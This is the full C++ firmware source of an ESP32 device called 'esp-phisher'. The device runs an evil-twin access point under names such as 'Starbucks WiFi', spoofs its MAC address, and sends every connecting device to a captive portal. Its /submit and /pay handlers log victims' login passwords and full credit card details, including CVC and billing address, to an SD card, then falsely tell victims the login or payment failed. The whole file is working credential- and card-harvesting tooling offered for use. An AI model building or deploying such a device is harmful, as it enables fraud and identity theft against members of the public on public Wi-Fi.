// esp-phisher v2.0.0 by SoCal IT github.com/socalit

#include <Arduino.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <SD.h>
#include <SPI.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <EEPROM.h>
#include <esp_wifi.h>
#include <RTClib.h>

#define SCREEN_WIDTH   128
#define SCREEN_HEIGHT    32
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define SD_CS           5
#define BTN_UP         32
#define BTN_DOWN       33
#define BTN_ENTER      25
#define BTN_BACK       26
#define LED_TX         12
#define LED_RX         13
#define LED_PWR        14

#define EEPROM_SIZE    128
#define SSID_OFFSET      4
#define BG_OFFSET       64
#define MAX_SSID_LEN    32
#define MAX_BG_LEN      16

RTC_DS3231 rtc;

String ap_ssid      = "Free Public WiFi";
String currentBG;
unsigned int lastLogSize = 0;

enum MenuState { HOME, MENU, VIEW_LOG, SET_SSID };
MenuState currentState    = HOME;
int       selectedMenu    = 0;
unsigned long lastInteraction = 0;
const unsigned long TIMEOUT_MS = 15000;

const char* const ssidOptions[] = {
  "Free Public WiFi","Airport Free WiFi","Starbucks WiFi",
  "Xfinity WiFi","Hotel Guest WiFi","Free Open WiFi","McDonald's WiFi"
};
int ssidIndex = 0;

DNSServer      dnsServer;
AsyncWebServer server(80);
const byte     DNS_PORT = 53;

const char portalHTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="0; url=/index.html">
</head><body>Redirecting</body></html>
)rawliteral";

void saveEEPROMString(int offset, const String &val, int maxLen) {
  EEPROM.begin(EEPROM_SIZE);
  int len = min((int)val.length(), maxLen - 1);
  for (int i = 0; i < len; ++i) EEPROM.write(offset + i, val[i]);
  EEPROM.write(offset + len, '\0');
  EEPROM.commit();
  EEPROM.end();
}
String loadEEPROMString(int offset, int maxLen, const String &fallback) {
  EEPROM.begin(EEPROM_SIZE);
  char buf[maxLen];
  for (int i = 0; i < maxLen; ++i) {
    buf[i] = EEPROM.read(offset + i);
    if (!buf[i]) break;
  }
  buf[maxLen - 1] = '\0';
  EEPROM.end();
  String s(buf);
  if (s.length()) return s;
  saveEEPROMString(offset, fallback, maxLen);
  return fallback;
}
void saveSSID(const String &s) { ap_ssid = s; saveEEPROMString(SSID_OFFSET, s, MAX_SSID_LEN); }
String loadSSID()            { return loadEEPROMString(SSID_OFFSET, MAX_SSID_LEN, ap_ssid); }
void saveBG(const String &bg){ saveEEPROMString(BG_OFFSET,      bg, MAX_BG_LEN); }
String loadBG()              { return loadEEPROMString(BG_OFFSET,      MAX_BG_LEN, String("bg.jpg")); }

void loadLastLogSize() {
  EEPROM.begin(EEPROM_SIZE);
  lastLogSize = EEPROM.readUInt(0);
  EEPROM.end();
}
void saveLogSize(unsigned int sz) {
  EEPROM.begin(EEPROM_SIZE);
  EEPROM.writeUInt(0, sz);
  EEPROM.commit();
  EEPROM.end();
}

unsigned int getLogSize() {
  if (!SD.exists("/log.txt")) return 0;
  File f = SD.open("/log.txt", FILE_READ);
  unsigned int sz = f.size();
  f.close();
  return sz;
}
void clearLogFile() {
  if (SD.exists("/log.txt")) SD.remove("/log.txt");
  saveLogSize(0);
  lastLogSize = 0;
}
void appendLog(const String &entry) {
  File f = SD.open("/log.txt", FILE_APPEND);
  if (!f) {
    Serial.println("Failed to open /log.txt");
    return;
  }
  f.print(entry);
  f.close();
}

String getTimestamp() {
  DateTime now = rtc.now();
  char buf[22];
  snprintf(buf, sizeof(buf),
           "[%04d-%02d-%02d %02d:%02d:%02d]",
           now.year(), now.month(), now.day(),
           now.hour(), now.minute(), now.second());
  return String(buf);
}

String urlEncode(const String &s) {
  String out; char h[4];
  for (char c: s) {
    if (isalnum(c) || c=='-'||c=='_'||c=='.') out += c;
    else if (c==' ') out += '+';
    else {
      sprintf(h, "%%%02X", (uint8_t)c);
      out += h;
    }
  }
  return out;
}
String sanitizeCard(const String &raw) {
  String num;
  for (char c: raw) if (isDigit(c)) num += c;
  return num;
}
String detectType(const String &num) {
  if (num.startsWith("4"))                        return "Visa";
  if (num.startsWith("51")||num.startsWith("52") ||
      num.startsWith("53")||num.startsWith("54") ||
      num.startsWith("55"))                       return "Mastercard";
  if (num.startsWith("34")||num.startsWith("37")) return "American Express";
  if (num.startsWith("6"))                        return "Discover";
  return "Unknown";
}

bool expiryValid(const String &exp) {
  int sep = exp.indexOf('/');
  if (sep < 1) return false;
  int m = exp.substring(0, sep).toInt();
  int y = exp.substring(sep+1).toInt();
  if (m < 1 || m > 12) return false;
  DateTime now = rtc.now();
  int cy = now.year(), cm = now.month();
  if (y < 100) y += 2000;
  if (y < cy) return false;
  if (y == cy && m < cm) return false;
  return true;
}

void drawHomeScreen() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.print("SSID: "); display.println(ap_ssid.substring(0,16));
  display.setCursor(0,10);
  int clients = WiFi.softAPgetStationNum();
  display.printf("Clients: %d", clients);
  digitalWrite(LED_RX, clients ? HIGH : (millis()/500)%2);
  display.setCursor(0,20);
  unsigned int cur = getLogSize();
  display.print("New Log: ");
  display.println(cur>lastLogSize?"YES":"NO");
  digitalWrite(LED_TX, (cur>lastLogSize)?HIGH:LOW);
  display.display();
}
void drawMenu() {
  const char* items[] = { "View Logins","Clear Logs","Set SSID","Reboot" };
  display.clearDisplay();
  for (int i=0;i<4;i++){
    display.setCursor(0,i*10);
    if(i==selectedMenu) display.print("> ");
    display.print(items[i]);
  }
  display.display();
}
void drawSSIDSelector() {
  display.clearDisplay();
  display.setCursor(0,0); display.println("Select SSID:");
  display.setCursor(0,10);
  display.print("> "); display.println(ssidOptions[ssidIndex]);
  display.display();
}
void drawLogView() {
  display.clearDisplay(); display.setCursor(0,0);
  if (!SD.exists("/log.txt")) {
    display.println("No logins.");
  } else {
    File f=SD.open("/log.txt",FILE_READ);
    for(int i=0;i<3 && f.available();i++){
      String ln=f.readStringUntil('\n');
      display.setCursor(0,i*10);
      display.print(ln.substring(0,20));
    }
    f.close();
    unsigned int cur=getLogSize();
    saveLogSize(cur);
    lastLogSize=cur;
  }
  display.display();
}

void handleButtons() {
  int total=sizeof(ssidOptions)/sizeof(ssidOptions[0]);
  if(!digitalRead(BTN_UP)){
    lastInteraction=millis();
    if(currentState==MENU) selectedMenu=(selectedMenu+3)%4;
    else if(currentState==SET_SSID) ssidIndex=(ssidIndex-1+total)%total;
    delay(200);
  }
  if(!digitalRead(BTN_DOWN)){
    lastInteraction=millis();
    if(currentState==MENU) selectedMenu=(selectedMenu+1)%4;
    else if(currentState==SET_SSID) ssidIndex=(ssidIndex+1)%total;
    delay(200);
  }
  if(!digitalRead(BTN_ENTER)){
    lastInteraction=millis();
    if(currentState==HOME) currentState=MENU;
    else if(currentState==MENU){
      if(selectedMenu==0) currentState=VIEW_LOG;
      else if(selectedMenu==1){ clearLogFile(); currentState=HOME; }
      else if(selectedMenu==2) currentState=SET_SSID;
      else if(selectedMenu==3) ESP.restart();
    }
    else if(currentState==VIEW_LOG) currentState=MENU;
    else if(currentState==SET_SSID){
      ap_ssid=ssidOptions[ssidIndex];
      saveSSID(ap_ssid);
      WiFi.softAP(ap_ssid.c_str());
      currentState=HOME;
    }
    delay(200);
  }
  if(!digitalRead(BTN_BACK)){
    lastInteraction=millis();
    currentState=HOME;
    delay(200);
  }
}

void blinkLed(int pin){
  for(;;){ digitalWrite(pin,HIGH); delay(250); digitalWrite(pin,LOW); delay(250); }
}

void captivePortal(AsyncWebServerRequest* r){
  r->send(200,"text/html",portalHTML);
}

void setUnifiMac(){
  uint8_t mac[6]={ 0x28,0x70,0x4E,
                   (uint8_t)random(0,256),
                   (uint8_t)random(0,256),
                   (uint8_t)random(0,256) };
  esp_wifi_set_mac(WIFI_IF_STA, mac);
  esp_wifi_set_mac(WIFI_IF_AP,  mac);
  Serial.printf("MAC spoofed: %02X:%02X:%02X:%02X:%02X:%02X\n",
                mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
}

void setup(){
  Serial.begin(115200);
  randomSeed(esp_random());

  Wire.begin(21,22);

  if(!rtc.begin()){ Serial.println("RTC not found"); blinkLed(LED_PWR); }
  if(rtc.lostPower()) rtc.adjust(DateTime(F(__DATE__),F(__TIME__)));

  EEPROM.begin(EEPROM_SIZE);
    loadLastLogSize();
    ap_ssid   = loadSSID();
    currentBG = loadBG();
  EEPROM.end();

  pinMode(BTN_UP,INPUT_PULLUP);
  pinMode(BTN_DOWN,INPUT_PULLUP);
  pinMode(BTN_ENTER,INPUT_PULLUP);
  pinMode(BTN_BACK,INPUT_PULLUP);
  pinMode(LED_TX,OUTPUT);
  pinMode(LED_RX,OUTPUT);
  pinMode(LED_PWR,OUTPUT);
  digitalWrite(LED_PWR,LOW);

  if(!display.begin(SSD1306_SWITCHCAPVCC,0x3C)) blinkLed(LED_PWR);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("esp-phisher v1.8.7");
  display.display();
  delay(500);

  if(!SD.begin(SD_CS)) blinkLed(LED_PWR);

  WiFi.mode(WIFI_AP);
  setUnifiMac();
  WiFi.softAP(ap_ssid.c_str());
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_max_tx_power(82);

  dnsServer.start(DNS_PORT,"*",WiFi.softAPIP());

  const char* cp[]={
    "/generate_204","/gen_204","/redirect",
    "/hotspot-detect.html","/fwlink","/ncsi.txt","/connecttest.txt"
  };
  for(auto&p:cp) server.on(p,HTTP_GET,captivePortal);

  server.serveStatic("/", SD, "/").setDefaultFile("index.html").setCacheControl("no-cache");
  server.serveStatic("/admin.html", SD, "/admin.html").setCacheControl("no-cache");
  server.serveStatic("/log.txt", SD, "/log.txt").setCacheControl("no-store,no-cache,must-revalidate,max-age=0");
  server.serveStatic("/img", SD, "/img").setCacheControl("no-cache");
  server.serveStatic("/bootstrap-5.3.7", SD, "/bootstrap-5.3.7").setCacheControl("no-cache");

  server.on("/bg", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200,"text/plain",currentBG);
  });

server.on("/bg", HTTP_POST, [](AsyncWebServerRequest *request) {
  if (!request->hasParam("key", true) || request->getParam("key", true)->value() != "3000")
    return request->send(403, "text/plain", "Forbidden");

  if (!request->hasParam("bg", true))
    return request->send(400, "text/plain", "Missing bg");

  String path = request->getParam("bg", true)->value();
  if (!path.endsWith(".jpg") || !SD.exists("/img/" + path))
    return request->send(400, "text/plain", "Invalid file");

  String srcPath = "/img/" + path;
  String dstPath = "/img/bg.jpg";
  if (SD.exists(dstPath)) SD.remove(dstPath);

  File src = SD.open(srcPath, FILE_READ);
  File dst = SD.open(dstPath, FILE_WRITE);

  if (!src || !dst) {
    if (src) src.close();
    if (dst) dst.close();
    return request->send(500, "text/plain", "File open error");
  }

  uint8_t buf[256];
  size_t n;
  while ((n = src.read(buf, sizeof(buf))) > 0) {
    dst.write(buf, n);
  }

  src.close();
  dst.close();

  currentBG = path;
  saveBG(currentBG);

  Serial.printf("✅ Copied %s → /img/bg.jpg\n", srcPath.c_str());
  request->send(200, "text/plain", "OK");
  });
  server.on("/ssid", HTTP_GET, [](AsyncWebServerRequest* r){
    r->send(200,"text/plain",ap_ssid);
  });
  server.on("/ssid", HTTP_POST, [](AsyncWebServerRequest* r){
    if(!r->hasParam("key",true)||r->getParam("key",true)->value()!="3000")
      return r->send(403,"text/plain","Forbidden");
    if(!r->hasParam("ssid",true))
      return r->send(400,"text/plain","Missing SSID");
    String s=r->getParam("ssid",true)->value();
    if(s.length()==0||s.length()>MAX_SSID_LEN)
      return r->send(400,"text/plain","Invalid SSID");
    ap_ssid=s; saveSSID(s);
    WiFi.softAP(ap_ssid.c_str());
    r->send(200,"text/plain","OK");
  });

  server.on("/time", HTTP_GET, [](AsyncWebServerRequest* r){
    DateTime now=rtc.now();
    char b[22];
    snprintf(b,sizeof(b),
             "[%04d-%02d-%02d %02d:%02d:%02d]",
             now.year(),now.month(),now.day(),
             now.hour(),now.minute(),now.second());
    r->send(200,"text/plain",String(b));
  });

  server.on("/time", HTTP_POST, [](AsyncWebServerRequest* r){
    if(!r->hasParam("key",true)||r->getParam("key",true)->value()!="3000")
      return r->send(403,"text/plain","Forbidden");
    if(!r->hasParam("datetime",true))
      return r->send(400,"text/plain","Missing datetime");
    String dt=r->getParam("datetime",true)->value();
    int y=dt.substring(0,4).toInt(),
        m=dt.substring(5,7).toInt(),
        d=dt.substring(8,10).toInt(),
        H=dt.substring(11,13).toInt(),
        M=dt.substring(14,16).toInt();
    rtc.adjust(DateTime(y,m,d,H,M,0));
    r->send(200,"text/plain","OK");
  });

  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest* r){
    auto gp=[&](const char*n){ return r->hasParam(n,true)?r->getParam(n,true)->value():String(); };
    String plat=gp("platform"), usr=gp("username"), pwd=gp("password");
    if(plat=="Google"&&usr.indexOf('@')<0) return r->redirect("/index.html?error=email");
    String ua=r->header("User-Agent"); if(ua=="") ua="unknown";
    String entry=getTimestamp()+" ["+plat+"] User:"+usr+" | Pass:"+pwd+" | Device:"+ua+"\n";
    appendLog(entry);
    digitalWrite(LED_TX,HIGH); delay(100); digitalWrite(LED_TX,LOW);
    r->redirect("/index.html?error=1");
  });

  server.on("/pay", HTTP_POST, [](AsyncWebServerRequest* r){
    auto gp = [&](const char* n){
      return r->hasParam(n, true)
           ? r->getParam(n, true)->value()
           : String();
    };

    String raw = gp("cardNumber");
    String num = sanitizeCard(raw);
    String typ = detectType(num);
    String exp = gp("expiry");

    if (!expiryValid(exp)) {
      return r->redirect(
        "/index.html?payError=" +
        urlEncode("Card expired. Please use a valid card.")
      );
    }

    if (num.length() != 16 || typ == "Unknown") {
      return r->redirect(
        "/index.html?payError=" +
        urlEncode("Invalid card number. Please enter 16 digits.")
      );
    }

String fn   = gp("firstName");
String ln   = gp("lastName");
String addr = gp("billingAddress");
String city = gp("billingCity");
String st   = gp("billingState");
String zip  = gp("zipcode");
String cvc  = gp("cvc");
String ua   = r->header("User-Agent");

String entry = getTimestamp()
  + " [CreditCard]"
  + " Name:"   + fn + " " + ln
  + " | Card:" + num + " | Type:" + typ
  + " | Exp:"  + exp + " | CVC:" + cvc
  + " | Addr:" + addr + " | City:" + city
  + " | State:" + st + " | Zip:" + zip
  + " | Device:" + ua + "\n";
appendLog(entry);




    digitalWrite(LED_TX, HIGH);
    delay(100);
    digitalWrite(LED_TX, LOW);

    r->redirect(
      "/index.html?payError=" +
      urlEncode("Payment not processed. Try again.")
    );
});

  server.on("/mark-read", HTTP_POST, [](AsyncWebServerRequest* r){
    if(!r->hasParam("key",true)||r->getParam("key",true)->value()!="3000")
      return r->send(403,"text/plain","Forbidden");
    saveLogSize(getLogSize());
    r->send(200,"text/plain","Marked");
  });

  server.on("/clear", HTTP_POST, [](AsyncWebServerRequest* r){
    if(!r->hasParam("key",true)||r->getParam("key",true)->value()!="3000")
      return r->send(403,"text/plain","Forbidden");
    clearLogFile();
    r->send(200,"text/plain","Cleared");
  });


  server.onNotFound(captivePortal);

  server.begin();
  Serial.println("server started");
  digitalWrite(LED_PWR,HIGH);
}

void loop(){
  dnsServer.processNextRequest();
  handleButtons();
  switch(currentState){
    case HOME:     drawHomeScreen();   break;
    case MENU:     drawMenu();         break;
    case VIEW_LOG: drawLogView();      break;
    case SET_SSID: drawSSIDSelector(); break;
  }
  if(millis()-lastInteraction>TIMEOUT_MS && currentState!=HOME){
    currentState=HOME;
  }
  delay(100);
}
